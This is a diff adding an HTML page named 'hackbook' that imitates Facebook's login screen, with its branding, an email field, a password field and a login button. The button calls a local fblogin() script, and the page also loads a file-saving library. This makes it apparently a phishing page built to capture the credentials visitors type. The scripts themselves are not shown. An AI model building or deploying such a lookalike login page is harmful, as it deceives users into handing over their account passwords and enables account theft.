@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/fblogin.css">
+    <title>hackbook</title>
+    <script src="js/fblogin.js"></script>
+    <script src="js/Filesaver.js"></script>
+</head>
+<body>
+    <div id="bg">
+        <div id="rt-area">
+            <div class="title" id="test-data">facebook</div>
+            <div class="subtitle">Facebook helps you connect and share with the people in your life.</div>
+        </div>
+        <div id="lt-area">
+            <div class="form">
+                <!-- <form action="#" method="get"> -->
+                    <div>
+                        <input type="text" id="usrname" name="usr" placeholder="Email address or Phone numebr">
+                    </div>
+                    <div>
+                        <input type="password" id="password" name="pwd" placeholder="Password">
+                    </div>
+                    <div>
+                        <input type="submit" value="Log in" id="lg-btn" onclick="fblogin()">
+                    </div>
+                  <!-- </form> -->
+                <div style="text-align: center;padding: 5px;font-size: 18px;"><a href="#" style="text-decoration: none;color: blue;">Forgotten password</a></div>
+                <hr>
+               
+                    <input type="button" value="Create New Account" onclick="window.location.href='#'" id="c-acc">
+               
+            </div>
+
+            <div class="c-page"><a href="#">Create a page</a> for celebrity, brand or business.</div>
+        </div>
+    </div>
+</body>
+</html>
